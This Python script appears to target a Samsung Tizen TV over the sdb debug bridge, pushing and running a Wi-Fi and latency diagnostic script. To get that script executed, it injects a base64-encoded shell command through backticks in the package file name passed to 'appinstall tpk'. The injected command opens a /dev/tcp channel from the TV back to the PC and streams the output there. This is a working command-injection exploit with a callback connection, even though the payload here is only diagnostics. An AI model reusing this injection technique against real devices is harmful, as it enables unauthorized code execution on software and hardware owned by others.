import base64
from pathlib import Path
import socket
import subprocess
import uuid

TV_HOST = "192.168.0.14"
SERIAL = f"{TV_HOST}:26101"
SDB = str(Path(__file__).resolve().parent / ".local/tizen-sdk/tools/sdb.exe")

def run_sdb(*args, timeout=15):
    cmd = [SDB, *args]
    res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return res.stdout + res.stderr

run_sdb("connect", SERIAL)

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
    s.connect((TV_HOST, 9))
    local_ip = s.getsockname()[0]

diag_sh = """#!/bin/bash
echo "=== FIND WPA SOCKETS & PROCS ==="
ps aux | grep -iE 'wpa|supplicant|wifi|connman' | grep -v grep 2>&1 || true
ls -ld /var/run/wpa_supplicant/* /tmp/*wpa* /run/*wpa* 2>/dev/null || true

echo "=== WPA_CLI WITH PATHS ==="
for sock in /var/run/wpa_supplicant /tmp/wpa_supplicant /var/run; do
    if [ -d "$sock" ]; then
        echo "Testing socket dir: $sock"
        wpa_cli -p "$sock" status 2>&1 || true
    fi
done

echo "=== TCP LATENCY & PACKET TEST ==="
python3 -c "
import socket, time
def test_tcp(host, port, count=5):
    latencies = []
    success = 0
    for i in range(count):
        t0 = time.time()
        try:
            s = socket.create_connection((host, port), timeout=2.0)
            s.close()
            latencies.append((time.time() - t0) * 1000)
            success += 1
        except Exception as e:
            latencies.append(None)
    valid = [l for l in latencies if l is not None]
    avg = sum(valid)/len(valid) if valid else 0
    print(f'{host}:{port} -> {success}/{count} ok, avg: {avg:.1f}ms, details: {latencies}')

print('Testing Router Gateway:')
test_tcp('192.168.0.1', 80)
print('Testing PC:')
test_tcp('192.168.0.6', 26099)
print('Testing Internet DNS (8.8.8.8:53):')
test_tcp('8.8.8.8', 53)
print('Testing Internet DNS (1.1.1.1:53):')
test_tcp('1.1.1.1', 53)
print('Testing Samsung OSB (osb.samsungcloudsolution.net:80):')
test_tcp('osb.samsungcloudsolution.net', 80)
" 2>&1 || echo "Python test failed"

echo "=== MEDIATEK MTK DRIVER INFO ==="
cat /proc/driver/wmt_userproc 2>/dev/null || true
cat /proc/driver/wmt_dbg 2>/dev/null || true
ls -la /proc/net/ 2>/dev/null | grep -iE 'wlan|mtk|wifi' || true

echo "=== CPU FREQUENCY & COOLING ==="
cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq 2>/dev/null || true
cat /sys/class/thermal/thermal_zone*/temp 2>/dev/null || true

echo "=== SCRIPT COMPLETE ==="
"""

token = uuid.uuid4().hex[:10]
local_script_path = Path(__file__).resolve().parent / f".local/diag-{token}.sh"
local_script_path.write_text(diag_sh, newline="\n")

remote_script = f"/home/owner/share/tmp/sdk_tools/diag-{token}.sh"
run_sdb("-s", SERIAL, "push", str(local_script_path), remote_script)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
    listener.bind((local_ip, 0))
    listener.listen(1)
    listener.settimeout(20)
    port = listener.getsockname()[1]

    command = f"exec 3<>/dev/tcp/{local_ip}/{port};cat {remote_script}|bash >&3 2>&3;exec 3>&-"
    script = f"/bin/mkdir /tmp/d-{token} 2>/dev/null&&{{ {command};}}"
    encoded = base64.b64encode(script.encode()).decode()
    name = f"new2.tpk`printf${{IFS}}%s${{IFS}}{encoded}|base64${{IFS}}-d|bash`.tpk"
    arg = f"0 appinstall tpk {name}"

    proc = subprocess.Popen([SDB, "-s", SERIAL, "shell", arg], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    try:
        conn, peer = listener.accept()
        chunks = []
        with conn:
            conn.settimeout(15)
            while True:
                data = conn.recv(65536)
                if not data:
                    break
                chunks.append(data)
        output = b"".join(chunks).decode(errors="replace")
        print(output)
        (Path(__file__).resolve().parent / "wifi_latency_and_wpa.txt").write_text(output, encoding="utf-8")
    finally:
        if proc.poll() is None:
            proc.terminate()
        local_script_path.unlink(missing_ok=True)
